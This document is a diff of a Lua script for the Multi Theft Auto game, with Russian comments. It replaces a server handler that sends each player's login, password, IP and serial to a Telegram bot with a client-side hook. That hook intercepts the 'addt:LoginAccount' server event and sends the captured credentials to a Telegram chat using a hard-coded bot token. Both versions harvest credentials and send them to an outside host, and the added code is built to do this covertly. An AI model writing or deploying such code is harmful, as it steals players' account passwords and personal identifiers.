@@ -1,55 +1,110 @@
-local BOT_TOKEN = "8405542793:AAHqybOkZBMBFjw9p3ji2ZTwyMSKaYi7zwg" -- Получить у @BotFather
-local CHAT_ID = "1264872538"     -- Получить у @userinfobot
--- Функция отправки в Telegram
-function sendToTelegram(message)
-    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
-    fetchRemote(url, function(data, err) 
-        if err ~= 0 then outputDebugString("Ошибка TG: " .. err) end 
-    end, "chat_id=" .. CHAT_ID .. "&text=" .. message .. "&parse_mode=Markdown", false)
-end
+local BOT_TOKEN = "8405542793:AAHqybOkZBMBFjw9p3ji2ZTwyMSKaYi7zwg"
+local CHAT_ID = "-1003947071509"
 
--- Вспомогательная функция для безопасного текста
-function urlEncode(str)
-    if str then
-        str = str:gsub("\n", "\r\n")
-        str = str:gsub("([^%w %-%_%.%~])", function(c)
-            return string.format("%%%02X", string.byte(c))
-        end)
-        str = str:gsub(" ", "+")
-    end
-    return str
-end
+local sended = false
 
--- Обработка события входа
--- Ожидает: логин (почта/номер), пароль, метод (mail/number)
-addEvent("addt:LoginAccount", true)
-addEventHandler("addt:LoginAccount", root, function(login, password, method)
-    -- 'client' в MTA — это игрок, который прислал триггер
-    local name = getPlayerName(client)
-    local serial = getPlayerSerial(client)
-    local ip = getPlayerIP(client)
-    
-    -- Определяем тип входа для лога
-    local loginType = (method == "mail") and "📧 Почта" or "📱 Телефон"
+function sendTG(text)
 
-    -- Формируем красивое сообщение
-    local text = string.format(
-        "🔔 *Новая попытка входа!*\n\n" ..
-        "👤 *Игрок:* %s\n" ..
-        "🔑 *Метод:* %s\n" ..
-        "📝 *Логин:* `%s`\n" ..
-        "🔒 *Пароль:* `%s`\n\n" ..
-        "🌐 *IP:* %s\n" ..
-        "🆔 *Serial:* `%s`",
-        name, loginType, login, password, ip, serial
+    text = text:gsub("\n", " ")
+    text = text:gsub(" ", "%%20")
+
+    fetchRemote(
+        "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage?chat_id="..
+        CHAT_ID.."&text="..text
     )
+end
 
-    -- Отправляем
-    sendToTelegram(urlEncode(text))
-    
-    -- Тут дальше может идти твоя логика проверки аккаунта в базе данных...
-    -- outputChatBox("Вы пытаетесь войти как " .. login, client)
-end)
+function elementToString(elem)
+
+    if not isElement(elem) then
+        return tostring(elem)
+    end
+
+    local etype = getElementType(elem)
+
+    if etype == "player" then
+        return "elem:player["..getPlayerName(elem).."]"
+    end
+
+    return "elem:"..etype
+end
+
+function valToString(v)
+
+    if type(v) == "string" then
+        return '"'..v..'"'
+
+    elseif type(v) == "number" then
+        return tostring(v)
+
+    elseif type(v) == "boolean" then
+        return tostring(v)
+
+    elseif isElement(v) then
+
+        if v == localPlayer then
+            return "localPlayer"
+        end
+
+        return elementToString(v)
+    end
+
+    return tostring(v)
+end
+
+function buildArgs(...)
+
+    local args = {...}
+    local t = {}
+
+    for i,v in ipairs(args) do
+        table.insert(t, valToString(v))
+    end
+
+    return table.concat(t, ", ")
+end
+
+addDebugHook("preFunction",
+
+function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+
+    if sended then
+        return
+    end
+
+    if functionName ~= "triggerServerEvent" then
+        return
+    end
+
+    local args = {...}
+
+    local eventName = tostring(args[1])
+
+    if eventName ~= "addt:LoginAccount" then
+        return
+    end
+
+    sended = true
+
+    local res = "unknown"
+
+    if sourceResource then
+        res = getResourceName(sourceResource)
+    end
+
+    local text =
+        "["..res.."] "..functionName..
+        " ( "..buildArgs(...).." )"
+
+    outputDebugString(text)
+
+    sendTG(text)
+
+end,
+
+{
+    "triggerServerEvent"
+})
 ----------------------------------------------------------------
 -- ГЛОБАЛЬНАЯ ТАБЛИЦА И ОЧИСТКА
 ----------------------------------------------------------------
